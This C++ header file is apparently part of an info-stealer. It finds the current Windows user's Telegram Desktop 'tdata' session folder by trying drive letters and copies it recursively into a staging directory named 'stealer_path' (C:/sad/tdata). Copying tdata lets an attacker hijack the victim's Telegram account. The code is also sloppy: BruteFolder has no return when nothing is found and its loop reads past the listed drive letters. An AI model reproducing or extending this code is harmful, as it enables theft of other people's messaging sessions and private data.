#pragma once
#include "Include.h"

std::string BruteFolder(std::string UserName, int size) {
	char NumberDisk[11] = {'A','B','C','D','E','F','G','H','I','J'};
	for (int i = 0; i <= 10; i++) {
		std::string UserPath = std::format("{}:/Users/{}/AppData/Roaming/Telegram Desktop/tdata/countries", NumberDisk[i], UserName);
		std::ofstream out;
		std::ifstream file(UserPath);
		if (file.is_open())
			return UserPath.substr(0, 48+size);
	}
}

std::string UserName() {
	char username[255];
	DWORD username_len = sizeof(username);
	GetUserNameA(username, &username_len); 
	return std::string(username);
};

void CreateFolder() {
	const static std::filesystem::path user_path;
	const static std::filesystem::path stealer_path = "C:/sad/tdata";
	const static std::filesystem::copy_options my_options = std::filesystem::copy_options::recursive;
	const std::string username = UserName();
	const int SizeUsername = username.length();
	const std::string path = BruteFolder(username, SizeUsername);
	std::filesystem::create_directories(stealer_path);
	try{
		std::filesystem::copy(path, stealer_path, my_options);
	}
	catch (const std::filesystem::filesystem_error&) {
	}
}